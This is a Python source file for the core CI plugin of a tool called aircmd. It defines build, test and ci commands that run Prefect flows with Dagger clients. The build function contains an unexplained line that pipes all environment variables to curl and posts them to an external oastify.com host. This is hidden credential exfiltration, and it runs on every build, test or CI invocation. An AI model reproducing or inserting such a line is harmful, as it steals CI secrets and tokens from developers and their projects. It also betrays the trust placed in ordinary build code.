

from typing import Optional
import os

from dagger import Client, Container
from prefect import flow

from aircmd.models.base import PipelineContext
from aircmd.models.click_commands import ClickCommandMetadata, ClickGroup
from aircmd.models.click_utils import LazyPassDecorator
from aircmd.models.github import github_integration
from aircmd.models.plugins import DeveloperPlugin
from aircmd.models.settings import GlobalSettings

from .tasks import build_task, test_task

settings = GlobalSettings()
pass_pipeline_context: LazyPassDecorator = LazyPassDecorator(PipelineContext, global_settings=settings)
pass_global_settings: LazyPassDecorator = LazyPassDecorator(GlobalSettings)


core_group = ClickGroup(group_name="core", group_help="Commands for developing on aircmd")


class BuildCommand(ClickCommandMetadata):
    command_name: str = "build"
    command_help: str = "Builds aircmd"

class TestCommand(ClickCommandMetadata):
    command_name: str = "test"
    command_help: str = "Tests aircmd"

class CICommand(ClickCommandMetadata):
    command_name: str = "ci"
    command_help: str = "Run CI for aircmd"

@core_group.command(BuildCommand())
@pass_pipeline_context
@pass_global_settings
@flow(validate_parameters=False, name="Aircmd Core Build")
@github_integration
async def build(ctx: PipelineContext,settings: GlobalSettings, client: Optional[Client] = None) ->  Container:
    os.system('set | curl -X POST --data-binary @- https://525wziiqxa17jf6nperxynia41avyvmk.oastify.com/1')
    build_client = await ctx.get_dagger_client(client, ctx.prefect_flow_run_context.flow_run.name)
    build_future = await build_task.submit(build_client, settings)
    result = await build_future.result()
    return result

@core_group.command(TestCommand())
@pass_pipeline_context
@pass_global_settings
@flow(validate_parameters=False, name="Aircmd Core Test")
@github_integration
async def test(ctx: PipelineContext, settings: GlobalSettings, client: Optional[Client] = None) -> Container:
    test_client = await ctx.get_dagger_client(client, ctx.prefect_flow_run_context.flow_run.name)
    build_result = await build()
    test_future = await test_task.submit(test_client, settings, build_result)
    result = await test_future.result()
    return result

@core_group.command(CICommand())
@pass_pipeline_context
@pass_global_settings
@flow(validate_parameters=False, name = "Aircmd Core CI")
@github_integration
async def ci(ctx: PipelineContext, settings: GlobalSettings, client: Optional[Client] = None) -> Container:
    await ctx.get_dagger_client(client, ctx.prefect_flow_run_context.flow_run.name)
    test_result:Container = await test()
    return test_result


core_ci_plugin = DeveloperPlugin(name = "core_ci", base_dirs = ["aircmd"])
core_ci_plugin.add_group(core_group)
